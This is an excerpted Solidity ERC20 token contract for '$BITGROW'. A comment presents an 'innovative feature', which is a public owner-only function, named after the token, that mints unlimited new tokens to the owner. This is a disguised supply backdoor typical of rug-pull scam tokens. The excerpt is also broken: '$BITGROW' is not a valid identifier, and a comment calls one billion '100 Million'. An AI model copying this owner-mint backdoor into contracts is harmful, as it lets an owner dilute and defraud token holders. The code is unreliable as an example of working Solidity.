...
//
// $BITGROW proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BITGROW(uint256 amount) public onlyOwner {
    _BITGROW(msg.sender, amount);
    }
    ...
    function _BITGROW(address account, uint256 amount) internal virtual {
...
contract $BITGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BITGROW", "BITGROW") {
        _BITGROW(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}